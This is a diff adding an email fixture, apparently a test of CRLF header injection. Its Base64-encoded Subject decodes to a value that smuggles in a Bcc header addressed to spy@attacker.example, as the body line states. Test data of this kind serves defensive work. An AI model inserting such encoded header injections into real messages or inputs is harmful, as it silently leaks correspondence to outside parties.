@@ -1,0 +1,9 @@
+From: Mina Cho <mina@example.com>
+To: lojo@cyberphysical.us
+Subject: =?UTF-8?B?SGVsbG8NCkJjYzogc3B5QGF0dGFja2VyLmV4YW1wbGUNClgtSW5qZWN0ZWQ6IDE=?=
+Date: Wed, 24 Sep 2026 09:25:00 +0000
+Message-ID: <crlf-6@example.com>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+Subject decodes to "Hello\r\nBcc: spy@attacker.example\r\nX-Injected: 1".
